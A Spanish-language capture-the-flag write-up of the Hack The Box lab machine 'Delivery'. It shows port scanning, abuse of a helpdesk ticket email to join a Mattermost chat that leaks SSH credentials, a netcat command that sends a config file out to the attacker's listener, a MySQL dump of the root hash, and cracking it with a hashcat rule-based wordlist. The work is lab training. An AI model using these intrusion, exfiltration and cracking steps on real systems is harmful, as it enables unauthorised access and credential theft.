---
title: Delivery WriteUp
date: 2023-04-27
categories: [WriteUps, Máquinas Linux]
tags: [Information Leakage, MySQL, cracking]
image:
  path: ../../assets/img/writeups/Delivery/delivery.png
  width: 528
  height: 340
  alt: Banner Delivery
---

Tenemos los puertos 22/ssh, 80/http y 8065 abiertos. Conseguimos ver un nombre de dominio desde el código fuente de la máquina. Entrando en él vemos un página que gestiona tickets, abriendo un ticket nos crear un correo que finalmente usamos para entrar al servicio Mattermost alojada en el puerto 8065. Dentro del mattermost vemos mensajes entre ellos la credencial via ssh del usuario maildeliverer, entramos al sistema.

Escalada: Buscando información dentro del sistema por las rutas de los servicios principales que operan, como las dos páginas web, encontramos una credencial de acceso a la base de datos. En la base de datos localizamos un hash del usuario root. Finalmente crackeamos ese hash creando un diccionario personalizado con variaciones de una palabra sacada gracias una pista que daban en la web del mattermost.

## Reconocimiento

Hoy intentaremos vulnerar la máquina **Delivery** de HTB(Hack The Box). La ip de la máquina es la `10.10.10.222`.

Veamos primero si tenemos conectividad con la ḿaquina. Antes de esto recuerda que debes conectarte a la vpn de HTB, te descargas una ovpn de la plataforma y te la ejecutas con la herramienta openvpn. Una vez que tienes la ovpn la tienes para siempre que quieras y no de problemas.  
Comprobamos conectividad:
```
❯ ping -c 1 10.10.10.222
PING 10.10.10.222 (10.10.10.222) 56(84) bytes of data.
64 bytes from 10.10.10.222: icmp_seq=1 ttl=63 time=46.9 ms

--- 10.10.10.222 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 46.936/46.936/46.936/0.000 ms
``` 
Y todo guay, un paquete enviado, un paquete recibido.

Realizaremos un escaneo de puertos con nmap, los puertos son las vías de entrada en una máquina.
``` 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.222 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-24 15:34 CEST
Initiating SYN Stealth Scan at 15:34
Scanning 10.10.10.222 [65535 ports]
Discovered open port 80/tcp on 10.10.10.222
Discovered open port 22/tcp on 10.10.10.222
Discovered open port 8065/tcp on 10.10.10.222
Completed SYN Stealth Scan at 15:34, 12.83s elapsed (65535 total ports)
Nmap scan report for 10.10.10.222
Host is up, received user-set (0.059s latency).
Scanned at 2023-04-24 15:34:14 CEST for 13s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
8065/tcp open  unknown syn-ack ttl 63
```
Las opciones usadas en el comando anterior son:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.222 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Tenemos 3 puertos abiertos, veamos con el siguiente comando algo más de información:
``` 
❯ nmap -p22,80,8065 -sC -sV 10.10.10.222 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-24 15:37 CEST
Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.83% done; ETC: 15:38 (0:00:00 remaining)
Nmap scan report for 10.10.10.222
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
8065/tcp open  unknown
| fingerprint-strings: 
y continua ...
```
* -sC : Lanza unos scrips básicos de reconocimiento.
* -sV : Para averiguar la versión de los servicios.

Del puerto 8065 salía bastante más texto pero nada interesante que yo viera.  
Tenemos los puertos 22/ssh, 80/http y 8065/?? abiertos.

## Buscando Vulnerabilidades

En el puerto 22 poco podemos hacer, no tenemos credenciales para acceso por ssh de momento, podríamos realizar una ataque de fuerza bruta pero de momento es mejor buscar por el puerto 80 o el 8065, y de paso descubrimos lo que es.

Voy a realizar un whatweb, herramienta tipo wappalizer pero desde terminal, esta herramienta busca las tecnologías que hay detrás de una web, como su servidor web o CMS. Lo lanzo también al puerto 8065 por probar si ese puerto es un servicio web.
```
❯ whatweb http://10.10.10.222
http://10.10.10.222 [200 OK] Country[RESERVED][ZZ], Email[jane@untitled.tld], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.222], JQuery, Script, Title[Welcome], nginx[1.14.2]
❯ whatweb http://10.10.10.222:8065
http://10.10.10.222:8065 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.222], Script, Title[Mattermost], UncommonHeaders[content-security-policy,x-request-id,x-version-id], X-Frame-Options[SAMEORIGIN]
```
Parece ser que el puerto 8065 es también una web.

Veamos que pinta tienen estas webs. Web del puerto 80:

![Web]({{ 'assets/img/writeups/Delivery/web80.png' | relative_url }}){: .center-image }

Y esta es la página del puerto 8065:

![Web-8065]({{ 'assets/img/writeups/Delivery/web8065.png' | relative_url }}){: .center-image }

¿Por cuál empezamos?..

Empiezo por la web del puerto 80.  
Así ha simple vista solo hay una página de contacto "Contact us", si entramos señala esto:  
**For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.**

Normalmente cuando veo un .htb lo añado al /etc/hosts para que reconozca luego el nombre. Asigno un nombre de dominio, en este caso delivery.htb a una ip `10.10.10.222`.   
Además de lo anterior si miramos el código fuente de la página principal (Ctrl + u es un atajo para ver el código fuente) veo un href que vincula a "http://helpdesk.delivery.htb" otro subdomio que habría que meter al /etc/hosts.
```
> nano /etc/hosts

# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.10.222  delivery.htb  helpdesk.delivery.htb
```
Una vez añadido veamos que contienen estos dominios.

El primero http://delivery.htb contiene lo mismo que en el puerto 80.  
El segundo http://helpdesk.delivery.htb/ ya contiene algo distinto. Parece ser un centro de soporte gestionado por tickets, es decir, tienes que abrir un ticket antes de solicitar asistencia al soporte. Necesito un correo electrónico para crear un ticket.

A pesar de leer que necesito un correo para crear el ticket yo pruebo. Y parece ser que puedo. Creo un ticket. me piden un correo, me lo invento; caguentodo@delivery.htb y un nombre; Caguen Todo.

Además tiene toda la pinta que nos han dado, con la creación del ticket, un correo:  
8876962@delivery.htb. Cada ticket nuevo te crea un correo.

Intentaré logearme con este correo en el apartado "Sign in", arriba a la derecha, pero me pide una contraseña que no tengo. Parece que tengo la opción de registrarme, lo hago pero hay un pequeño problema, me pide que confirme el correo y las máquinas de htb no tienen conexión a internet..Tendré que ingeniarmelas de otra manera.

![Confirmar]({{ 'assets/img/writeups/Delivery/confirmar.png' | relative_url }}){: .center-image }

Quizás pueda usar ese correo o ese ticket que me han creado de alguna manera para que me envíen un mensaje de confirmación de correo y así poder logearme.  
En "check ticket" meto el correo que se ha creado; 8876962@delivery.htb y el ticket abajo, pero nada, me sale " Access Denied". Pruebo a meter el correo con el que cree el ticket; caguentodo@delivery.htb y el ticket abajo; 8876962. Y ahora sí, entro a lo que parece una bandeja de entrada de correo, pero realmente es una bandeja donde, supongo, que se deben seguir los mensajes del hilo creado. Intuyo que el correo que se creo; 8876962@delivery.htb va vínculado a este hilo y que si en "Create an accout" pusiera ese correo igual podría confirmarlo desde este lugar.

![Dentro-Ticket]({{ 'assets/img/writeups/Delivery/dentroTicket.png' | relative_url }}){: .center-image }


Antes de crear una cuenta voy a intentar logearme con el correo y el número de ticket como contraseña, pero nada, era lo más normal.  
Me creo una cuenta con el correo anterior; 8876962@delivery.htb y la contraseña; ticket123  
Ahora voy a "Check Ticket Status" a ver si puedo confirmarla desde ahí, con el correo de caguentodo@delivery.htb. Pero nada...

Puedo que la otra web, en el puerto 8065, tenga vínculación con esta parte. Así que nos vamos al Mattermost, que por cierto ¿Qué es Mattermost?:  
Mattermost es un servicio de chat en línea de código abierto y autohospedable con intercambio de archivos, búsqueda e integraciones. Está diseñado como un chat interno para organizaciones y empresas.

Voy a crearme una cuenta, a la hora de crearla te pasa lo mismo que antes, tienes que confirmarla y no puedes. Intentaré de nuevo el uso de ese correo/hilo que se creo antes en el registro.  
Así en la creación de cuenta del mattermost pongo lo siguiente:  
correo: 8876962@delivery.htb
password: tesT123456$%  (me pedían requisitos..)

Y ahora miro en "Check Ticket Status":

![Enlace-Confirmar]({{ 'assets/img/writeups/Delivery/enlaceConfir.png' | relative_url }}){: .center-image }

¡¡Y tenemos el enlace para confirmar!!.

Confirmamos y ahora podemos introducirnos en las profundidades del mattermost y ver que hay en el chat interno de la empresa uouououo.

![Chat-Interno]({{ 'assets/img/writeups/Delivery/internalChat.png' | relative_url }}){: .center-image }

Y veo unas credenciales. Atento también a lo de abajo, parece que están usando variantes de la contraseña "PleaseSubscribe!" para algo, podría ser para otros usuarios dentro del sistema.  

Credenciales encontrada: maildeliverer:Youve_G0t_Mail!

El puerto 22/ssh está abierto, veamos si puedo entrar.
``` bash 
❯ ssh maildeliverer@10.10.10.222

The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts.
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ whoami
maildeliverer
```

Estamos dentro de la máquina. Cambiamos la variable de entorno TERM para mejorar la consola y poder hacer CTRl + l. Veamos la primera flag:
``` 
maildeliverer@Delivery:~$ export TERM=xterm
maildeliverer@Delivery:~$ ls
user.txt
maildeliverer@Delivery:~$ cat user.txt
10d4f1c02015090bb8b237ae*******
```

## Escalada de privilegios


Empezaré por mi escructura de comandos para ver opciones de escalada:
```
maildeliverer@Delivery:/$ id
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)

maildeliverer@Delivery:/$ sudo -l
[sudo] password for maildeliverer: 
Sorry, user maildeliverer may not run sudo on Delivery.

maildeliverer@Delivery:/$ find / \-perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/fusermount
```
No tiene permiso de sudo y el único SUID vulnerable es pkexec, vulnerabilidad descubierta después de la creación de la máquina. Así que esta caja no esta hecha para ser vulnerada de esta manera.

Sigamos con el reconocimiento para escalada de privilegios:
```
maildeliverer@Delivery:/$ uname -a
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
maildeliverer@Delivery:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 10 (buster)
Release:	10
Codename:	buster
maildeliverer@Delivery:/$ getcap -r / 2>/dev/null
```
Las versiones no son vulnerables. Tampoco tiene capabilities.

Ahora voy a husmear por las rutas de la web a ver si veo credenciales. Normalmente las rutas web en linux están en /var/www/html. Esta vez una más para atrás tenemos carpeta osticket.
```
maildeliverer@Delivery:/var/www/osticket$ pwd
/var/www/osticket
maildeliverer@Delivery:/var/www/osticket$ ls -la
total 16
drwxr-xr-x  4 www-data www-data 4096 Jul 14  2021 .
drwxr-xr-x  4 root     root     4096 Jul 14  2021 ..
drwxr-xr-x  2 www-data www-data 4096 Jul 14  2021 scripts
drwxr-xr-x 12 www-data www-data 4096 Jul 14  2021 upload
maildeliverer@Delivery:/var/www/osticket$ grep -riE "password|passwd"
```
Sale bastante info a mirar, pero ninguna contraseña, que haya visto yo al menos.  
Con esto hemos mirado la parte correspondiente a la parte de osticket. Faltaría la correspondiente al Mattermost. Podemos localizar estos archivos de dos maneras; mediante una búsqueda find o buscando el proceso del mattermost donde si el binario está en la misma carpeta que el resto de su contenido veremos todo.  
Con find desde raíz:
```
maildeliverer@Delivery:/$ find -name \*mattermost\* 2>/dev/null

./etc/systemd/system/multi-user.target.wants/mattermost.service
./opt/mattermost
./opt/mattermost/client/images/mattermost-cloud.svg
./opt/mattermost/client/emoji/mattermost.png
./opt/mattermost/client/plugins/com.mattermost.plugin-channel-export
./opt/mattermost/client/plugins/com.mattermost.plugin-incident-management
./opt/mattermost/client/plugins/com.mattermost.nps
./opt/mattermost/logs/mattermost.log
./opt/mattermost/plugins/com.mattermost.plugin-channel-export
./opt/mattermost/plugins/com.mattermost.plugin-incident-management
./opt/mattermost/plugins/com.mattermost.nps
./opt/mattermost/bin/mattermost
./opt/mattermost/prepackaged_plugins/mattermost-plugin-github-v0.14.0-linux-amd64.tar.gz

* Y unas cuantas líneas más
```
Y buscando el proceso de mattermost:
```
maildeliverer@Delivery:/$ ps -faux | grep mattermost

maildel+  1860  0.0  0.0   6048   884 pts/0    S+   12:07   0:00              \_ grep mattermost
matterm+   723  0.1  3.5 1649596 142268 ?      Ssl  09:54   0:10 /opt/mattermost/bin/mattermost
matterm+  1361  0.0  0.4 1234164 18856 ?       Sl   10:55   0:00  \_ plugins/com.mattermost.plugin-channel-export/server/dist/plugin-linux-amd64
matterm+  1368  0.0  0.5 1239060 22932 ?       Sl   10:55   0:00  \_ plugins/com.mattermost.nps/server/dist/plugin-linux-amd64
```
En ambas búsquedas encontramos una ruta interesante que es /opt/mattermost.

Voy a esa ruta y veo la carpeta config, me meto y busco por la palabra password:
```
maildeliverer@Delivery:/opt/mattermost/config$ grep -riE password

config.json:    "PasswordSettings": {
config.json:        "SMTPPassword": "",
config.json:        "BindPassword": "",
config.json:        "Password": "changeme",
config.json:            "SmtpPassword": "",
```
¡¡Cuidadin!!!. Puedes pensar que no hay nada, pero piensa que puede que este en la siguiente linea a la palabra buscada, tiene toda la pinta. Voy a ver que hay en ese archivo que se ve, el config.json.

Como hay bastante contenido en este archivo voy a pasarlo a mi máquina y lo visualizaré con el comando jq (jason) para verlo más bonico.  
Desde mi máquina, me pongo en escucha:
```
❯ nc -nlvp 4448 > config.json
listening on [any] 4448 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.222] 56220
```
Y en la máquina objetivo:
```
maildeliverer@Delivery:/opt/mattermost/config$ nc 10.10.14.2 4448 < config.json
```
Ahora volviendo a la mia hago **Ctrl + c** y veo el archivo. Curioseamos un poco:
```
> cat config.json | jq
* Mucho contenido, voy a hacer un less -S , para verlo poco a poco.
> cat config.json | jq | less -S
```
Y consigo ver unas credenciales de acceso para la base de datos SQL.

![Sql-Credenciales]({{ 'assets/img/writeups/Delivery/credenSQL.png' | relative_url }}){: .center-image }

Las credenciales parecen ser:  
mmuser:Crack_The_MM_Admin_PW

```
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p'Crack_The_MM_Admin_PW' 

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 207
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> 
```
¡Atention Please!. No pongas espacio entre la opción **p** y la contraseña, porque no te deja acceder por esa chorrada.

Luego uso estos comandos dentro:
``` 
use mattermost;  
show tables;  
describe Users;  
select Username,Password from Users;
root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```
Veo varios usuarios y varios hashes pero el que más me interesa es el de root.

Cada hash tiene un formato y para crackearlo con la herramienta **hashcat** tenemos que indicar el modo que corresponde a un formato determinado. Este formato se suele saber con el principio de cada hash, en este caso el $2a. Filtraré sobre él en los ejemplos de hashes:
```
❯ hashcat --example-hashes | grep '$2a'
HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou

❯ hashcat --example-hashes | grep '$2a' -C 5
HASH: 792FCB0AE31D8489:7284616727
PASS: hashcat

MODE: 3200
TYPE: bcrypt $2*$, Blowfish (Unix)
HASH: $2a$05$MBCzKhG1KhezLh.0LRa0Kuw12nLJtpHy6DIaU.JAnqJUDYspHC.Ou
PASS: hashcat
```
La opción C es para que te liste 5 líneas abajo y 5 líneas arriba. Encontramos el modo 3200 bcrypt.

Intentando crackearlo con el diccionario rockyou.txt no encontramos la contraseña después de un buen rato. El comando es:
```
> hashcat -m 3200 hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
En el anterior comando podrías añadir la opción -a 0 .Esto es para indicar que el tipo de ataque es de fuerza bruta, pero no hace falta, si no pones nada por defecto es ese.

Recordando lo que ya hemos visto había algo bastante interesante en el mattermost. Nos instaban a cambiar las combinaciones de la contraseña "PleaseSubscribe!", además no estaba en el rockyou.txt. Voy a crear un diccionario con variaciones de esta palabra y lo usaré luego para intentar crackear el hash.

Primero creo el diccionario:
```
❯ hashcat --stdout palabra -r /usr/share/hashcat/rules/best64.rule > passwords
```
"palabra" es un fichero que contiene la palabra PleaseSubscribe!  
La opción --stdout es para que no realize la crackeación. O así lo entiendo.  
La opción -r es de usar una regla, que indicamos seguidamente, la best64.rule. Te creará una combinación de 64 palabras de la palabra indicada.

Ahora probamos a crackear la contraseña usando ese diccionario:
```
❯ hashcat -m 3200 hash /home/guise/Desktop/HTB/Delivery/content/passwords1

hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 2672/2736 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashfile 'hash' on line 1 (root:$...ev0O.1STWb4.4ScG.anuu7v0EFJwgjjO): Token length exception
No hashes loaded.

Started: Thu Apr 27 17:08:52 2023
Stopped: Thu Apr 27 17:08:52 2023
```
Lo de arriba no funciona, pone "No hashes load", y eso es porque guardé el fichero hash con el formato root:hash, es decir, puse el usuario primero, para arreglarlo y que omita el usuario puedes poner la opción --user, o quitar el usuario(root) del fichero:
```
❯ hashcat -m 3200 hash --user /home/guise/Desktop/HTB/Delivery/content/passwords1
```
Y el resultado del crackeo es PleaseSubscribe!21

![Crackeo]({{ 'assets/img/writeups/Delivery/crackeado.png' | relative_url }}){: .center-image }

Veamos si esta es la contraseña para escalar a root:
```
maildeliverer@Delivery:~$ su root
Password: 

root@Delivery:/home/maildeliverer# id
uid=0(root) gid=0(root) groups=0(root)

root@Delivery:/home/maildeliverer# cat /root/root.txt
eb6cd595223af9491595dae5bc*******
```
¡¡¡¡Y máquina hackeada!!!!. 

Fin.






















